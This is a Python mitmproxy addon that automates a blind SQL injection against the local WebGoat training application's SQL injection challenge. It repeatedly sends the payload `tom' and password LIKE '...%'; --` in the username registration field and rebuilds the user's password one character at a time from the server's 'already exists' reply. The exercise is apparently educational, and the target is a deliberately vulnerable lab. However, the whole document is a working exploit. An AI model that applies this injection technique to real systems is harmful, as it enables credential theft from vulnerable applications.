from urllib.parse import urlencode, urlparse
import collections
import random
import string

from mitmproxy import http
from mitmproxy import ctx

import requests

URL = 'http://localhost:8000/WebGoat/SqlInjection/challenge'

found = False
def perform_bulk_requests(request):
  global found
  print("{perform bulk requests...")
  username_reg = "tom' and password LIKE '{like_content}%'; --"
  data = {
      'username_reg': None,
      'password_reg': 'password',
      'email_reg': 'password@example.com',
      'confirm_password_reg': 'password',
  }
  prefix = ''
  for _ in range(len(string.ascii_lowercase + string.ascii_uppercase) * 20):
    if found:
      break
    for letter in string.ascii_lowercase + string.ascii_uppercase:
      temp_prefix = prefix + letter
      data['username_reg'] = username_reg.format(like_content=temp_prefix)
      url = urlencode(data)
      response = requests.put(URL, headers=request.headers, data=data)
      if b'already exists please' in response.content:
        prefix += letter
        print(prefix)
        break
    else:
      print('Found password: ' + prefix)
      found = True


def get_rnd_user():
  return 'user' + ''.join(random.choices(string.ascii_lowercase, k=10))

def request(flow: http.HTTPFlow) -> None:
  global found
  if 'challenge' in flow.request.url and not found:
    perform_bulk_requests(flow.request)


def response(flow: http.HTTPFlow) -> None:
  global found
  if 'challenge' in flow.request.url and not found:
    print(flow.response.content)
    flow.kill()
